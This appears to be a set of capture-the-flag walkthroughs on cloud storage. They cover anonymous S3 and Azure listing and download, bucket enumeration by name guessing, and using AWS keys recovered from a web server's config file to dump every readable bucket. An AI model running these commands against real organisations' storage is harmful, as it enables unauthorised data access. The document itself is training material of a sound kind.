# 17 Cloud — full walkthroughs

---

## Walkthrough 1: "Find the flag.txt in the public S3 bucket `acme-dev-backups`"

**Type:** S3 anonymous read | **Difficulty:** easy | **Time:** <1 min

1. List the bucket:
   ```bash
   aws s3 ls s3://acme-dev-backups --no-sign-request
   ```
   Output:
   ```
   2024-03-15 10:21:04       1823 db-dump.sql
   2024-03-15 10:21:04         42 flag.txt
   2024-03-15 10:21:04      10234 users.csv
   ```
2. Download:
   ```bash
   aws s3 cp s3://acme-dev-backups/flag.txt . --no-sign-request
   cat flag.txt
   ```
3. **Answer:** contents of `flag.txt`.

**Gotcha:** if `aws` isn't installed, the HTTP URL works in Firefox:
```
http://acme-dev-backups.s3.amazonaws.com/flag.txt
```

---

## Walkthrough 2: "Find buckets belonging to `acme`"

1. Run cloud_enum:
   ```bash
   cloud_enum -k acme
   ```
2. Output (truncated):
   ```
   [+] Open S3 Bucket:       https://acme-logs.s3.amazonaws.com
   [+] Protected S3 Bucket:  https://acme-prod.s3.amazonaws.com
   [+] Open Azure Container: https://acme.blob.core.windows.net/public
   ```
3. Enumerate the open one:
   ```bash
   aws s3 ls s3://acme-logs --recursive --no-sign-request
   ```
4. **Answer:** list of open buckets + contents.

**Tip:** if cloud_enum isn't available, loop common suffixes:
```bash
for w in backup dev prod stage logs assets private; do
  curl -s -o /dev/null -w "%{http_code} acme-$w\n" http://acme-$w.s3.amazonaws.com/
done
```
HTTP `200` = listable.

---

## Walkthrough 3: "You found AWS keys on a web server — list all accessible buckets"

1. Keys recovered from `/var/www/html/config.php`:
   ```
   AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
   AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
   ```
2. Configure aws cli:
   ```bash
   aws configure
   # paste AK, SK, region us-east-1, output json
   ```
3. Identity check:
   ```bash
   aws sts get-caller-identity
   ```
   Output:
   ```
   "Arn": "arn:aws:iam::123456789012:user/webapp-deploy"
   ```
4. List buckets:
   ```bash
   aws s3 ls
   ```
5. Dump everything you can read:
   ```bash
   for b in $(aws s3 ls | awk '{print $3}'); do
     echo "== $b =="; aws s3 ls s3://$b 2>/dev/null
   done
   ```
6. **Answer:** list of buckets + files exposed.

---

## Walkthrough 4: "Extract data from an Azure blob container named `public-docs`"

1. Test anonymous list:
   ```bash
   curl "https://acmestore.blob.core.windows.net/public-docs/?restype=container&comp=list"
   ```
2. Response is XML listing `<Blob><Name>...</Name>`. Grep names:
   ```bash
   curl -s "https://acmestore.blob.core.windows.net/public-docs/?restype=container&comp=list" \
     | grep -oP '(?<=<Name>)[^<]+'
   ```
3. Download a specific blob:
   ```bash
   curl -O "https://acmestore.blob.core.windows.net/public-docs/secrets.txt"
   ```
4. **Answer:** content of downloaded blob.
